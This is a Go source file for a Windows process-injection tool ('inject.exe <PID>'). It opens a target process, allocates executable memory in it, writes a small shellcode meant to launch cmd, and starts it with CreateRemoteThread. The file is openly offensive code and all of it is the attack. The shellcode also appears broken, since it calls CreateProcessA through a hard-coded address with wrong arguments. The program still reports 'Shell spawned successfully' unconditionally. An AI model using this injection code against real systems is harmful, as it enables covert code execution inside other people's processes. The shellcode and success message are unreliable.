package main

import (
	"fmt"
	"log"
	"os"
	"strconv"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

var (
	modKernel32           = syscall.NewLazyDLL("kernel32.dll")
	procVirtualAllocEx    = modKernel32.NewProc("VirtualAllocEx")
	procWriteProcessMemory = modKernel32.NewProc("WriteProcessMemory")
	procCreateRemoteThread = modKernel32.NewProc("CreateRemoteThread")
)

func main() {
	if len(os.Args) < 2 {
		fmt.Println("Usage: inject.exe <PID>")
		fmt.Println("Example: inject.exe 1234")
		os.Exit(1)
	}

	pidStr := os.Args[1]
	targetPID, err := strconv.ParseUint(pidStr, 10, 32)
	if err != nil {
		log.Fatalf("Invalid PID: %v", err)
	}

	hProcess, err := windows.OpenProcess(
		windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION,
		false,
		uint32(targetPID),
	)
	if err != nil {
		log.Fatalf("OpenProcess failed for PID %d: %v", targetPID, err)
	}
	defer windows.CloseHandle(hProcess)

	shellcode := []byte{
		0x68, 0x63, 0x6d, 0x64, 0x00, // push "cmd\0"
		0x8b, 0xc4,                   // mov eax, esp
		0x50,                         // push eax
		0x6a, 0x00,                   // push 0
		0xff, 0x15, 0x10, 0x00, 0x00, 0x00, // call [CreateProcessA]
		0xc3,                         // ret
	}

	// VirtualAllocEx remote process memory allocation
	addr, _, err := procVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_EXECUTE_READWRITE,
	)
	if addr == 0 {
		log.Fatalf("VirtualAllocEx failed: %v", err)
	}

	// WriteProcessMemory shellcode writing
	ret, _, err := procWriteProcessMemory.Call(
		uintptr(hProcess),
		addr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		0,
	)
	if ret == 0 {
		log.Fatalf("WriteProcessMemory failed: %v", err)
	}

	// CreateRemoteThread execute shellcode
	hThread, _, err := procCreateRemoteThread.Call(
		uintptr(hProcess),
		0,
		0,
		addr,
		0,
		0,
		0,
	)
	if hThread == 0 {
		log.Fatalf("CreateRemoteThread failed: %v", err)
	}
	defer windows.CloseHandle(windows.Handle(hThread))

	fmt.Printf("Shell spawned successfully in process %d\n", targetPID)
}

//func init() {
//	isElevated := windows.GetCurrentProcessToken().IsElevated()
//	if !isElevated {
//		log.Fatal("This program requires administrative privileges.")
//	}
//}
